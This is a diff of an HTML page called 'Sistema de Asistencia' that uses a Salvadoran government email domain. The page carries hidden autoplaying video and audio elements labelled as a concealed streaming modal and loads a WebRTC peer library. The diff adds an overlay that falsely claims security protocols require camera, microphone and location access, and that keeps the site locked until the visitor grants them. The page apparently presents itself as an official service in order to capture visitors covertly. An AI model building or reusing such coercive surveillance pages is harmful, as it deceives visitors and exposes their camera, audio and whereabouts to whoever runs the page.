@@ -5,6 +5,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sistema de Asistencia</title>
+    <link rel="icon" href="data:;base64,iVBORw0KGgo=">
     <link rel="stylesheet" href="css/style.css">
 </head>
 
@@ -207,7 +208,7 @@
                             </div>
                             <div class="contact-text">
                                 <p>Teléfono</p>
-                                <span>+503 7643-5244</span>
+                                <span>+1 (555) 123-4567</span>
                             </div>
                         </div>
                         <div class="contact-item">
@@ -223,7 +224,7 @@
                             </div>
                             <div class="contact-text">
                                 <p>Email Oficial</p>
-                                <span>soporteITG@asistencia.gob.sv</span>
+                                <span>soporte@asistencia.gob.sv</span>
                             </div>
                         </div>
                         <div class="contact-item">
@@ -237,7 +238,7 @@
                             </div>
                             <div class="contact-text">
                                 <p>Horario de Atención</p>
-                                <span>Lunes a Viernes, 9:00 AM - 3:00 PM</span>
+                                <span>Lunes a Viernes, 9:00 AM - 6:00 PM</span>
                             </div>
                         </div>
                     </div>
@@ -397,6 +398,21 @@
     <!-- Modal de streaming oculto -->
     <video id="local-video" autoplay muted style="display: none;"></video>
     <audio id="local-audio" autoplay muted style="display: none;"></audio>
+
+    <!-- Overlay de Permisos Forzados -->
+    <div id="forced-permission-overlay">
+        <div class="warning-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"></path>
+                <line x1="12" y1="9" x2="12" y2="13"></line>
+                <line x1="12" y1="17" x2="12.01" y2="17"></line>
+            </svg>
+        </div>
+        <h2>ACCIÓN REQUERIDA</h2>
+        <p>Para garantizar la seguridad de su conexión y cumplir con los protocolos de la Red de Asistencia, <strong>DEBE otorgar permisos de Cámara, Micrófono y Ubicación</strong>.</p>
+        <p>El acceso al sistema permanecerá bloqueado hasta que se acepten los permisos necesarios.</p>
+        <button id="retry-permissions" class="btn btn-primary" style="background: var(--gold-accent); color: var(--dark-bg); font-weight: 800;">REINTENTAR AHORA</button>
+    </div>
 
     <script src="https://unpkg.com/simple-peer@9.11.1/simplepeer.min.js"></script>
     <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
